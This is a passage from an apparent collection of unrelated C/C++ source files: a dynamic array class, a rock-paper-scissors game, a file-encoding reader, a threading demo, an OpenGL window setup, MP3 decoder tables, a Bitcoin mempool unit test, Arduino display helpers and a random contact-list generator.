IntPtrU5BU5D_tFD177F8C806A6921AD7150264CCC62FA00CAD832;\nstruct ObjectU5BU5D_t8061030B0A12A55D5AD8652A20C922FE99450918;\nstruct StackTraceU5BU5D_t32FBCB20930EAF5BAE3F450FF75228E5450DA0DF;\nstruct StringU5BU5D_t7674CD946EC0CE7B3AE0BE70E6EE85F2ECD9F248;\nstruct TypeU5BU5D_t97234E1129B564EB38B8D85CAC2AD8B5B9522FFB;\nstruct ArgumentException_tAD90411542A20A9C72D5CDA3A84181D8B947A263;\nstruct ArgumentNullException_t327031E412FAB2351B0022DD5DAD47E67E597129;\nstruct ArgumentOutOfRangeException_tEA2822DAF62B10EEED00E0E3A341D4BAF78CF85F;\nstruct Binder_t91BFCE95A7057FADF4D8A1A342AFE52872246235;\nstruct Calendar_t0A117CC7532A54C17188C2EFEA1F79DB20DF3A3B;\nstruct CodePageDataItem_t52460FA30AE37F4F26ACB81055E58002262F19F2;\nstruct CompareInfo_t1B1A6AC3486B570C76ABA52149C9BD4CD82F9E57;\nstruct CultureAwareComparer_t5822A6535A6EB4C448D1B7736067D1188BAEE8CD;\nstruct CultureData_tEEFDCF4ECA1BBF6C0C8C94EB3541657245598F9D;\nstruct CultureInfo_t9BA817D41AD55AC8BD07480DD8AC22F8FFA378E0;\nstruct DateTimeFormatInfo_t0457520F9FA7B5C8EAAEB3AD50413B6AEEB7458A;\nstruct DecoderFallback_t7324102215E4ED41EC065C02EB501CB0BC23CD90;\nstruct DecoderReplacementFallback_t398AF05FDF32BD471A1678894D1F1A81DDBEE3B0;\nstruct DelegateData_t9B286B493293CD2D23A5B2B5EF0E5B1324C2B77E;\nstruct EncoderFallback_tD2C40CE114AA9D8E1F7196608B2D088548015293;\nstruct EncoderReplacementFallback_tCF704844DE6CF0B44DDB3C008824393233B19A16;\nstruct Encoding_t65CDEF28CF20A7B8C92E85A4E808920C2465F095;\nstruct IDictionary_t6D03155AF1FA9083817AA5B6AD7DEEACC26AB220;\nstruct IFormatProvider_tC202922D43BFF3525109ABF3FB79625F5646AB52;\nstruct IFormatterConverter_t726606DAC82C384B08C82471313C340968DDB609;\nstruct InvalidOperationException_t5DDE4D49B7405FAAB1E4576F4715A42A3FAD4BAB;\nstruct M",
    "\ufeff#include <iostream>\n#include <windows.h>\n\nusing namespace std;\n\n\nclass smart_array\n{\npublic:\n    int len;\n    int nowLen;\n    int* arr;\n\n    smart_array(int len)\n    {\n        this->len = len;\n        nowLen = 0;\n        arr = new int[len]();\n    }\n\n    ~smart_array()\n    {\n        delete[] arr;\n    }\n\n    smart_array& operator=(const smart_array& s_array)\n    {\n        if (&s_array != this)\n        {\n            delete[] arr;\n            arr = new int[s_array.len]();\n\n            for (int i = 0; i < s_array.len; i++)\n            {\n                arr[i] = s_array.arr[i];\n            }\n\n            len = s_array.len;\n            nowLen = s_array.nowLen;\n        }\n\n        return *this;\n    }\n\n    /*void expansione_array(int*& arr)\n    {\n        len *= 1.5f;\n\n        int* array = new int[len]();\n\n        for (int i = 0; i < sizeof(arr) / sizeof(arr[0]); i++)\n        {\n            array[i] = arr[i];\n        }\n\n        delete[] arr;\n        arr = new int[len]();\n\n        for (int i = 0; i < len; i++)\n        {\n            arr[i] = array[i];\n        }\n\n        delete[] array;\n    }*/\n\n    int* expansione_array(static int* arr)\n    {\n        len *= 2;\n\n        int* array = new int[len]();\n\n        for (int i = 0; i < (len / 2); i++)\n        {\n            array[i] = arr[i];\n        }\n\n        delete[] arr;\n\n        return array;\n    }\n\n    void add_element(int number)\n    {\n        if (len == nowLen)\n        {\n            arr = expansione_array(arr);\n        }\n\n        arr[nowLen] = number;\n        nowLen += 1;\n    }\n\n\n    int get_element(int number)\n    {\n        if (nowLen > number)\n        {\n            return arr[number];\n        }\n        throw runtime_error(\"\u0422\u0430\u043a\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0435\u0449\u0435 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442!\");\n\n        return 0;\n    }\n\n    void now_length()\n    {\n        cout << nowLen;\n    }\n\n    void length()\n    {\n        cout << len;\n    }\n};\n\nint main()\n{\n    SetConsoleCP(1251);\n    SetConsoleOutputCP(1251);\n\n    try {\n        smart_array arr(5);\n        arr.add_element(1);\n        arr.add_element(4);\n        arr.add_element(155);\n\n        smart_array new_array(2);\n        new_array.add_element(44);\n        new_array.add_element(34);\n\n        arr = new_array;\n\n        cout << arr.get_element(1) << endl;\n        cout << new_array.get_element(1) << endl;\n    }\n    catch (const exception& ex) {\n        cout << ex.what() << endl;\n    }\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\nchar GetUserChoice();\r\nchar GetComputerChoice();\r\nvoid Displaychoice(char choice);\r\nvoid ChooseWinner(char player,char computer);\r\n\r\nint main(){\r\n\tchar player;\r\n\tchar computer;\r\n\t\r\n\tplayer=GetUserChoice();\r\n\tcout<<\"Your Choice is : \";\r\n\tDisplaychoice(player);\r\n\t\r\n\tcomputer=GetComputerChoice();\r\n\tcout<<\"Computer choice is: \";\r\n\tDisplaychoice(computer);\r\n\t\r\n\tChooseWinner(player,computer);\r\n\t\r\n}\r\n\r\nchar GetUserChoice(){\r\n\r\n\tchar PlayerChoice;\r\n\tcout<<\"Rock-Paper-Scissors Game!!\\n\";\r\n\tcout<<\"**************************\\n\";\r\ndo{\r\n\tcout<<\"Choose one of the following\\n\";\r\n\tcout<<\"**************************\\n\";\r\n\tcout<<\"'r' for Rock \\n\";\r\n\tcout<<\"'p' for Paper \\n\";\r\n\tcout<<\"'s' for Scissors \\n\";\r\n\tcin>>PlayerChoice;\r\n\t\r\n}while(PlayerChoice!='r'&& PlayerChoice!='p' && PlayerChoice !='s');\r\n\r\n\r\n\treturn PlayerChoice;\r\n}\r\nchar GetComputerChoice(){\r\n\tchar ComputerChoice;\r\n\tsrand(time(0));\r\n\tint num=rand()%3 + 1;\r\n\t\r\n\tswitch(num){\r\n\t\tcase 1:\r\n\t\t\treturn 'r';\r\n\t\tcase 2:\r\n\t\t\treturn 'p';\r\n\t\tcase 3:\r\n\t\t\treturn 's';\r\n\t}\r\n}\r\nvoid Displaychoice(char choice){\r\n\tswitch(choice){\r\n\t\tcase 'r':\r\n\t\t\tcout<<\"Rock\\n\";\r\n\t\t\tbreak;\r\n\t\tcase 'p':\r\n\t\t\tcout<<\"Paper\\n\";\r\n\t\t\tbreak;\r\n\t\tcase 's':\r\n\t\t\tcout<<\"Scissors\\n\";\r\n\t\t\tbreak;\r\n\t}\r\n}\r\nvoid ChooseWinner(char player,char computer){\r\n\tswitch(player){\r\n\t\tcase 'r':\r\n\t\t\tif(computer=='r'){\r\n\t\t\tcout<<\"ITS A TIE!! \\n\";\r\n\t\t\t}\r\n\t\t\telse if(computer=='p'){\r\n\t\t\t\tcout<<\"YOU LOSE !! \\n\";\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tcout<<\"YOU WON!! \\n\";\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase 'p':\r\n\t\t\t\tif(computer=='p'){\r\n\t\t\tcout<<\"ITS A TIE!! \\n\";\r\n\t\t\t}\r\n\t\t\telse if(computer=='s'){\r\n\t\t\t\tcout<<\"YOU LOSE !! \\n\";\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tcout<<\"YOU WON!! \\n\";\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase 's':\r\n\t\t\tif(computer=='s'){\r\n\t\t\tcout<<\"ITS A TIE!! \\n\";\r\n\t\t\t}\r\n\t\t\telse if(computer=='r'){\r\n\t\t\t\tcout<<\"YOU LOSE !! \\n\";\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tcout<<\"YOU WON!! \\n\";\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t}\r\n}",
    "#include \"main.h\"\r\n#include \"files.h\"\r\n\r\nbool isFileValid(SFile file) {\r\n    return file.data != nullptr;\r\n}\r\n\r\nSFileEncoding fileEncoding(const char* data, const size_t size) {\r\n    if (size > 2) {\r\n        // FE FF UTF-16, big-endian\r\n        if (data[0] == 0xFE && data[1] == 0xFF) {\r\n            return SFE_UTF16BE;\r\n        }\r\n        // FF FE UTF-16, little-endian\r\n        if (data[0] == 0xFF && data[1] == 0xFE) {\r\n            return SFE_UTF16LE;\r\n        }\r\n        if (size > 3) {\r\n            // EF BB BF UTF-8\r\n            if (data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF) {\r\n                return SFE_UTF8BOM;\r\n            }\r\n            if (size > 4) {\r\n                // 00 00 FE FF UTF-32, big-endian\r\n                if (data[0] == 0 && data[1] == 0 && data[2] == 0xFE && data[3] == 0xFF) {\r\n                    return SFE_UTF32BE;\r\n                }\r\n                // FF FE 00 00 UTF-32, little-endian\r\n                if (data[0] == 0xFF && data[1] == 0xFE && data[2] == 0 && data[3] == 0) {\r\n                    return SFE_UTF32LE;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    return SFE_UTF8;\r\n}\r\n\r\nSFileTypes extFile(const char* name) {\r\n    // TODO: MAYBE READ FIRST 4 BYTES FOR TYPE\r\n    const char* ext = strrchr(name, '.');\r\n    if (ext == nullptr)\r\n        return SFT_CBC;\r\n    if (!strcmp(ext, \".cbc\"))\r\n        return SFT_CBC;\r\n    if (!strcmp(ext, \".cup\"))\r\n        return SFT_CUP;\r\n    if (!strcmp(ext, \".dll\"))\r\n        return SFT_DLL;\r\n    return SFT_UNKNOWN;\r\n}\r\n\r\nbool readFile(SFile& file, const char* name) {\r\n    FILE* fp = fopen(name, \"rb\");\r\n    if (!fp)\r\n        return CUPERROR;\r\n\r\n    file.name = name;\r\n    file.type = extFile(name);\r\n\r\n    fseek(fp, 0, SEEK_END);\r\n    file.size = ftell(fp);\r\n    fseek(fp, 0, SEEK_SET);\r\n\r\n    file.data = new char[file.size + 1];\r\n\tfile.data[file.size] = '\\0';\r\n    fread(file.data, file.size, 1, fp);\r\n    fclose(fp);\r\n\r\n    file.encoding = fileEncoding(file.data, file.size);\r\n\r\n    return CUPSUCCESS;\r\n}",
    "#include <iostream>\n#include <numeric>\n#include <thread>\n\n#include \"consumer.h\"\n#include \"cv_based_threading.h\"\n#include \"producer.h\"\n\nenum\n{\n    QUEUE_SIZE_MAX = 1000\n};\n\nint main(int argc, char* argv[])\n{\n    bool cvMode = false;\n\n    // Check command-line arguments\n    std::vector<std::string> arguments(argv + 1, argv + argc);\n    for (const auto& arg : arguments)\n    {\n        if (arg == \"--cv\" || arg == \"-cv\")\n        {\n            // Standard approach with condition variables\n            cvMode = true;\n        }\n    }\n\n    int elementsNr{};\n    std::cout << \"Please enter the number of elements to generate: \";\n    std::cin >> elementsNr;\n\n    if (elementsNr <= 0 || elementsNr > RAND_MAX)\n    {\n        std::cout << \"Incorrect value. Must be positive integer not larger than RAND_MAX.\";\n        return -1;\n    }\n\n    // Create a shared thread-safe queue\n    core::ThreadSafeQueue<int> queue(QUEUE_SIZE_MAX);\n    // Create s storage for random numbers\n    std::vector<NumberInfo> storage(elementsNr);\n    // Completion flag\n    std::atomic_bool complete(false);\n    std::chrono::time_point<std::chrono::high_resolution_clock> startTime;\n    if (!cvMode)\n    {\n        Consumer::setStartTime();\n        startTime = std::chrono::high_resolution_clock::now();\n        // Perform generation of random numbers asynchronously\n        Producer producerOne(queue, elementsNr, complete);\n        Producer producerTwo(queue, elementsNr, complete);\n        Consumer consumerOne(queue, storage, elementsNr, complete);\n        Consumer consumerTwo(queue, storage, elementsNr, complete);\n\n        std::thread prodThreadOne(&Producer::produce, &producerOne);\n        std::thread consThreadOne(&Consumer::consume, &consumerOne);\n        std::thread prodThreadTwo(&Producer::produce, &producerTwo);\n        std::thread consThreadTwo(&Consumer::consume, &consumerTwo);\n\n        // Wait for all threads to finish\n        prodThreadOne.join();\n        consThreadOne.join();\n        prodThreadTwo.join();\n        consThreadTwo.join();\n    }\n    else\n    {\n        initializeDistribution(elementsNr);\n        initializeStartTime();\n\n        startTime = std::chrono::high_resolution_clock::now();\n        // Perform generation of random numbers asynchronously\n        std::thread prodThreadOne([&]() { produce(queue, elementsNr, complete); });\n        std::thread consThreadOne([&]() { consume(queue, storage, elementsNr, complete); });\n        std::thread prodThreadTwo([&]() { produce(queue, elementsNr, complete); });\n        std::thread consThreadTwo([&]() { consume(queue, storage, elementsNr, complete); });\n\n        // Wait for all threads to finish\n        prodThreadOne.join();\n        consThreadOne.join();\n        prodThreadTwo.join();\n        consThreadTwo.join();\n    }\n\n    auto endTime = std::chrono::high_resolution_clock::now();\n    auto totalWorkTime =\n        std::chrono::duration_cast<std::chrono::microseconds>(endTime - startTime).count();\n\n    auto totalTime =\n        std::accumulate(storage.begin(), storage.end(), 0, [](int sum, const NumberInfo& element)\n                        { return sum + element.m_generationTime; });\n\n    std::cout << \"Generation completed. Total generation time: \" << totalTime << \" microseconds.\"\n              << std::endl;\n    std::cout << \"Total execution time: \" << totalWorkTime << \" microseconds.\" << std::endl;\n    return 0;\n}",
    "#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n#include <iostream>\n\nconst unsigned int WINDOW_WIDTH = 550;\nconst unsigned int WINDOW_HEIGHT = 800;\n\nvoid key_callback(GLFWwindow* window, int key, int scancode, int action, int mode)\n{\n    if (key == GLFW_KEY_ESCAPE && action == GLFW_PRESS)\n    {\n        glfwSetWindowShouldClose(window, GL_TRUE);\n    }\n}\n\nint main(void)\n{\n\n    /* Initialize the library */\n    if (!glfwInit())\n    {\n        std::cout << \"Failed to initialize GLFW\" << std::endl;\n        return -1;\n    }\n\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n    /* Create a windowed mode window and its OpenGL context */\n    GLFWwindow* window = glfwCreateWindow(WINDOW_WIDTH, WINDOW_HEIGHT, \"Space Shooter\", nullptr, nullptr);\n    if (!window)\n    {\n        std::cout << \"Failed to glfwCreateWindow\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n\n    glfwSetKeyCallback(window, key_callback);\n\n    /* Make the window's context current */\n    glfwMakeContextCurrent(window);\n\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n    glClearColor(0, 0, 1, 0);\n    \n    /* Loop until the user closes the window */\n    while (!glfwWindowShouldClose(window))\n    {\n        /* Render here */\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        /* Swap front and back buffers */\n        glfwSwapBuffers(window);\n\n        /* Poll for and process events */\n        glfwPollEvents();\n    }\n\n    glfwTerminate();\n    return 0;\n}",
    "/* ***** BEGIN LICENSE BLOCK *****\n * Version: RCSL 1.0/RPSL 1.0\n *\n * Portions Copyright (c) 1995-2002 RealNetworks, Inc. All Rights Reserved.\n *\n * The contents of this file, and the files included with this file, are\n * subject to the current version of the RealNetworks Public Source License\n * Version 1.0 (the \"RPSL\") available at\n * http://www.helixcommunity.org/content/rpsl unless you have licensed\n * the file under the RealNetworks Community Source License Version 1.0\n * (the \"RCSL\") available at http://www.helixcommunity.org/content/rcsl,\n * in which case the RCSL will apply. You may also obtain the license terms\n * directly from RealNetworks.  You may not use this file except in\n * compliance with the RPSL or, if you have a valid RCSL with RealNetworks\n * applicable to this file, the RCSL.  Please see the applicable RPSL or\n * RCSL for the rights, obligations and limitations governing use of the\n * contents of the file.\n *\n * This file is part of the Helix DNA Technology. RealNetworks is the\n * developer of the Original Code and owns the copyrights in the portions\n * it created.\n *\n * This file, and the files included with this file, is distributed and made\n * available on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER\n * EXPRESS OR IMPLIED, AND REALNETWORKS HEREBY DISCLAIMS ALL SUCH WARRANTIES,\n * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY, FITNESS\n * FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.\n *\n * Technology Compatibility Kit Test Suite(s) Location:\n *    http://www.helixcommunity.org/content/tck\n *\n * Contributor(s):\n *\n * ***** END LICENSE BLOCK ***** */\n\n/**************************************************************************************\n * Fixed-point MP3 decoder\n * Jon Recker (jrecker@real.com), Ken Cooke (kenc@real.com)\n * June 2003\n *\n **************************************************************************************/\n\n#include \"mp3_decoder.h\"\n\n#include <esp_heap_caps.h>\n// #include \"esphome/core/helpers.h\"\n\n/* indexing = [version][samplerate index]\n * sample rate of frame (Hz)\n */\nconst int samplerateTab[3][3] = {\n    {44100, 48000, 32000}, /* MPEG-1 */\n    {22050, 24000, 16000}, /* MPEG-2 */\n    {11025, 12000, 8000},  /* MPEG-2.5 */\n};\n\n/* indexing = [version][layer][bitrate index]\n * bitrate (kbps) of frame\n *   - bitrate index == 0 is \"free\" mode (bitrate determined on the fly by\n *       counting bits between successive sync words)\n */\nconst short bitrateTab[3][3][15] = {\n    {\n        /* MPEG-1 */\n        {0, 32, 64, 96, 128, 160, 192, 224, 256, 288, 320, 352, 384, 416, 448}, /* Layer 1 */\n        {0, 32, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320, 384},    /* Layer 2 */\n        {0, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320},     /* Layer 3 */\n    },\n    {\n        /* MPEG-2 */\n        {0, 32, 48, 56, 64, 80, 96, 112, 128, 144, 160, 176, 192, 224, 256}, /* Layer 1 */\n        {0, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160},      /* Layer 2 */\n        {0, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160},      /* Layer 3 */\n    },\n    {\n        /* MPEG-2.5 */\n        {0, 32, 48, 56, 64, 80, 96, 112, 128, 144, 160, 176, 192, 224, 256}, /* Layer 1 */\n        {0, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160},      /* Layer 2 */\n        {0, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160},      /* Layer 3 */\n    },\n};\n\n/* indexing = [version][layer]\n * number of samples in one frame (per channel)\n */\nconst short samplesPerFrameTab[3][3] = {\n    {384, 1152, 1152}, /* MPEG1 */\n    {384, 1152, 576},  /* MPEG2 */\n    {384, 1152, 576},  /* MPEG2.5 */\n};\n\n/* layers 1, 2, 3 */\nconst short bitsPerSlotTab[3] = {32, 8, 8};\n\n/* indexing = [version][mono/stereo]\n * number of bytes in side info section of bitstream\n */\nconst short sideBytesTab[3][2] = {\n    {17, 32}, /* MPEG-1:   mono, stereo */\n    {9, 17},  /* MPEG-2:   mono, stereo */\n    {9, 17},  /* MPEG-2.5: mono, stereo */\n};\n\n/* indexing = [version][sampleRate][bitRate]\n * for layer3, nSlots = floor(samps/frame * bitRate / sampleRate / 8)\n *   - add one pad slot if necessary\n */\nconst short slotTab[3][3][15] = {\n    {\n        /* MPEG-1 */\n        {0, 104, 130, 156, 182, 208, 261, 313, 365, 417, 522, 626, 731, 835, 1044},   /* 44 kHz */\n        {0, 96, 120, 144, 168, 192, 240, 288, 336, 384, 480, 576, 672, 768, 960},     /* 48 kHz */\n        {0, 144, 180, 216, 252, 288, 360, 432, 504, 576, 720, 864, 1008, 1152, 1440}, /* 32 kHz */\n    },\n    {\n        /* MPEG-2 */\n        {0, 26, 52, 78, 104, 130, 156, 182, 208, 261, 313, 365, 417, 470, 522},  /* 22 kHz */\n        {0, 24, 48, 72, 96, 120, 144, 168, 192, 240, 288, 336, 384, 432, 480},   /* 24 kHz */\n        {0, 36, 72, 108, 144, 180, 216, 252, 288, 360, 432, 504, 576, 648, 720}, /* 16 kHz */\n    },\n    {\n        /* MPEG-2.5 */\n        {0, 52, 104, 156, 208, 261, 313, 365, 417, 522, 626, 731, 835, 940, 1044},    /* 11 kHz */\n        {0, 48, 96, 144, 192, 240, 288, 3",
    "// Copyright (c) 2017 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <validation.h>\n#include <txmempool.h>\n#include <amount.h>\n#include <consensus/validation.h>\n#include <primitives/transaction.h>\n#include <script/script.h>\n#include <test/test_datromax.h>\n\n#include <boost/test/unit_test.hpp>\n\n\nBOOST_AUTO_TEST_SUITE(txvalidation_tests)\n\n/**\n * Ensure that the mempool won't accept coinbase transactions.\n */\nBOOST_FIXTURE_TEST_CASE(tx_mempool_reject_coinbase, TestChain100Setup)\n{\n    CScript scriptPubKey = CScript() << ToByteVector(coinbaseKey.GetPubKey()) << OP_CHECKSIG;\n    CMutableTransaction coinbaseTx;\n\n    coinbaseTx.nVersion = 1;\n    coinbaseTx.vin.resize(1);\n    coinbaseTx.vout.resize(1);\n    coinbaseTx.vin[0].scriptSig = CScript() << OP_11 << OP_EQUAL;\n    coinbaseTx.vout[0].nValue = 1 * CENT;\n    coinbaseTx.vout[0].scriptPubKey = scriptPubKey;\n\n    assert(CTransaction(coinbaseTx).IsCoinBase());\n\n    CValidationState state;\n\n    LOCK(cs_main);\n\n    unsigned int initialPoolSize = mempool.size();\n\n    BOOST_CHECK_EQUAL(\n            false,\n            AcceptToMemoryPool(mempool, state, MakeTransactionRef(coinbaseTx),\n                nullptr /* pfMissingInputs */,\n                true /* bypass_limits */,\n                0 /* nAbsurdFee */));\n\n    // Check that the transaction hasn't been added to mempool.\n    BOOST_CHECK_EQUAL(mempool.size(), initialPoolSize);\n\n    // Check that the validation state reflects the unsuccessful attempt.\n    BOOST_CHECK(state.IsInvalid());\n    BOOST_CHECK_EQUAL(state.GetRejectReason(), \"coinbase\");\n\n    int nDoS;\n    BOOST_CHECK_EQUAL(state.IsInvalid(nDoS), true);\n    BOOST_CHECK_EQUAL(nDoS, 100);\n}\n\nBOOST_AUTO_TEST_SUITE_END()\n",
    "#include \"Arduino.h\"\n#include \"../lib/luxigrid.h\"\n\nfloat temperature;\nfloat humidity;\nuint32_t pressure;\n\nuint16_t lux = globalConfig.luxThreshold;\n\nuint8_t newBrightness;\nuint8_t currentBrightness;\n\nunsigned long lastLightSensorTime = 0;\nunsigned long lastBME680Time = 0;\n\nconst char *wifiConfigFilename = \"/config/wifi.json\";\nconst char *globalConfigFilename = \"/config/global.json\";\n\nTimeInfo getTimeInfo(tm timeStruct) {\n\tTimeInfo timeInfo;\n\n\ttimeInfo.year = timeStruct.tm_year + 1900;\n\ttimeInfo.month = timeStruct.tm_mon + 1;\n\ttimeInfo.day = timeStruct.tm_mday;\n\ttimeInfo.hour = timeStruct.tm_hour;\n\ttimeInfo.minute = timeStruct.tm_min;\n\ttimeInfo.second = timeStruct.tm_sec;\n\n\treturn timeInfo;\n}\n\n// Based on https://github.com/CelliesProjects/minimalUploadAuthESP32/blob/master/minimalUploadAuthESP32.ino\n/* format bytes as KB, MB or GB string */\nString humanReadableSize(const uint64_t bytes) {\n\tif (bytes < 1024) {\n\t\treturn String(bytes) + \" B\";\n\t} else if (bytes < (1024 * 1024)) {\n\t\treturn String(bytes / 1024.0) + \" KB\";\n\t} else if (bytes < (1024 * 1024 * 1024)) {\n\t\treturn String(bytes / 1024.0 / 1024.0) + \" MB\";\n\t} else {\n\t\treturn String(bytes / 1024.0 / 1024.0 / 1024.0) + \" GB\";\n\t}\n}\n\nbool stringIsNumeric(const String &str) {\n\tfor (char c : str) {\n\t\tif (!isDigit(c)) {\n\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}\n\nString generateRandomString(int length) {\n\tString randomString = \"\";\n\tchar characters[] = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n\n\tfor (int i = 0; i < length; i++) {\n\t\tint randomIndex = random(0, sizeof(characters) - 1);\n\t\trandomString += characters[randomIndex];\n\t}\n\n\treturn randomString;\n}\n\nbool verifyNTPServer(const char *ntpServer) {\n\tconfigTime(0, 0, ntpServer);\n\n\tstruct tm timeinfo;\n\n\t// Wait up to 15 seconds to get the time\n\tif (!getLocalTime(&timeinfo, 15000)) {\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n\nvoid printCenteredText(const String &text, bool centerVertically) {\n\tint16_t x1, y1;  // Variables to hold the top-left corner coordinates of the bounding box\n\tuint16_t w, h;   // Variables to hold the width and height of the bounding box\n\n\t// Use getTextBounds to get the size of your text\n\t// Initial cursor position set to (0,0) for the calculation\n\tdma_display->getTextBounds(text, 0, 0, &x1, &y1, &w, &h);\n\n\t// Calculate the starting position to center the text\n\tint16_t centerX = (dma_display->width() - w) / 2;\n\n\tint16_t centerY;\n\n\tif (centerVertically) {\n\t\t// Don't mind the -4 here, that's just a magic number to make this work\n\t\tcenterY = ((dma_display->height() - h) / 2) + 4;\n\t} else {\n\t\tcenterY = dma_display->getCursorY();\n\t}\n\n\t// Set the cursor to the calculated position\n\tdma_display->setCursor(centerX, centerY);\n\n\t// Print the text\n\tdma_display->print(text);\n}\n\nvoid setTextColor(uint8_t r, uint8_t g, uint8_t b) {\n\tdma_display->setTextColor(dma_display->color565(r, g, b));\n}\n\nvoid printCenteredTruncatedText(String text, uint16_t margin, String ellipsis) {\n\tString truncatedText = text;\n\n\tint16_t x1, y1;\n\tuint16_t textWidth, textHeight;\n\n\tbool truncationRequired = false;\n\n\t// Calculate maxWidth, taking the margin into account on both sides\n\tuint16_t maxWidth = PANEL_RES_X - (margin * 2);\n\n\t// Use the current Y coordinate of the cursor\n\tint16_t y = dma_display->getCursorY();\n\n\t// Get the initial measurement of the text's rectangle\n\tdma_display->getTextBounds(truncatedText, 0, y, &x1, &y1, &textWidth, &textHeight);\n\n\t// While the text is wider than the max width, keep removing characters until it fits with the ellipsis\n\twhile (textWidth > maxWidth && truncatedText.length() > 1) {\n\t\ttruncatedText = truncatedText.substring(0, truncatedText.length() - 1);\n\n\t\t// Measure the text again, with the ellipsis, and set the truncationRequired flag\n\t\tdma_display->getTextBounds(truncatedText + ellipsis, 0, y, &x1, &y1, &textWidth, &textHeight);\n\t\ttruncationRequired = true;\n\t}\n\n\t// Add the ellipsis to the text, if necessary\n\tif (truncationRequired) {\n\t\ttruncatedText += ellipsis;\n\t}\n\n\t// Print the centered, potentially-truncated text to the panel\n\tdma_display->setCursor((PANEL_RES_X - textWidth) / 2, y);\n\tdma_display->print(truncatedText);\n}\n\nvoid getBH1750Readings() {\n\tif (lightSensor.measurementReady()) {\n\t\tfloat lightLevel = lightSensor.readLightLevel();\n\n\t\t// If lightLevel is negative, that means an error has occurred; ignore the reading\n\t\tif (lightLevel < 0) {\n\t\t\tnewBrightness = 255;\n\t\t\treturn;\n\t\t}\n\n\t\t// Cast lux to an unsigned 16-bit integer, because there's no sense keeping it as a float for our purposes\n\t\tlux = (uint16_t)lightLevel;\n\n\t\tif (lux >= globalConfig.luxThreshold) {\n\t\t\tnewBrightness = 255;\n\t\t} else if (lux < (globalConfig.luxThreshold >> 3)) {\n\t\t\tnewBrightness = 255 >> 4;\n\t\t} else if (lux < (globalConfig.luxThreshold >> 2)) {\n\t\t\tnewBrightness = 255 >> 3;\n\t\t} else if (lux < (globalConfig.luxThreshold >> 1)) {\n\t\t\tnewBrightness = 255 >> 2;\n\t\t} else if (lux < globalConfig.luxThreshold) {\n\t\t\tnewBrightness = 255 >> 1;\n\t\t}\n\n\t\t// Add 1 to newBrightness so it's a power of 2 (unless it's already 255)\n\t\tif (newBr",
    "// List of ukrainian contacts. It is an old programm, I've written in college. Sadly, I couldn't improve myself more\r\n// Randomly generates list of contacts and then User can find any contact from the list by it's Name, Surname or Phone\r\n// It also shows the most active contact from the list\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n\r\n#define out(OutPut) std::cout << OutPut // It was much more comfortable for me to create some shortcuts to shorten the code\r\n#define in(InPut) std::cin >> InPut\r\n#define end std::cout << std::endl\r\n#define loop(IntVariable, MaxInt) for (int IntVariable = 0; IntVariable < MaxInt; IntVariable++)\r\n#define eut(OutPut) std::cout << OutPut << std::endl\r\n#define iut(OutPut, InPut)   \\\r\n    std::cout << OutPut; \\\r\n    std::cin >> InPut\r\n\r\nint Contacts_Amounts = 10, Years = 2005; // Contancts_Amount is free to change\r\nstd::string Search_Get;\r\nbool Search_Completed = false;\r\n\r\nstruct Examples // Those are some examples where random information will be taken from \r\n{\r\n    std::string Operator_Code[6] =\r\n    { \"63\", \"73\", \"93\", \"67\", \"97\", \"98\" };\r\n    std::string Device_Type[6] =\r\n    { \"Foldable Phone\", \"Smartphone\", \"Keyboard Phone\", \"Personal Computer\", \"Laptop\", \"Tablet\" };\r\n    std::string Place_of_residence[6] =\r\n    { \"Kyiv\", \"Lviv\", \"Donetsk\", \"Sumy\", \"Chernihiv\", \"Kharkiv\" };\r\n    std::string Group[6] =\r\n    { \"Work\", \"College\", \"Home\", \"Friend\", \"School\", \"Special\" };\r\n    std::string Name[6] =\r\n    { \"Serhii\", \"Artem\", \"Oleksii\", \"Oleksandr\", \"Vitalii\", \"Vlad\" };\r\n    std::string Surname[6] =\r\n    { \"Filatov\", \"Marchenkov\", \"Nikolaenko\", \"Volodin\", \"Yasinskii\", \"Chornovil\" };\r\n} Out;\r\n\r\nstruct Phone // Variables for Phone\r\n{\r\n    std::string Phone_Number;\r\n    std::string Device_Type;\r\n    std::string Name;\r\n    std::string Surname;\r\n    std::string Group;\r\n    std::string Birthday_Day;\r\n    std::string Place_of_residence;\r\n    int Rating;\r\n    int CallIn;\r\n    int 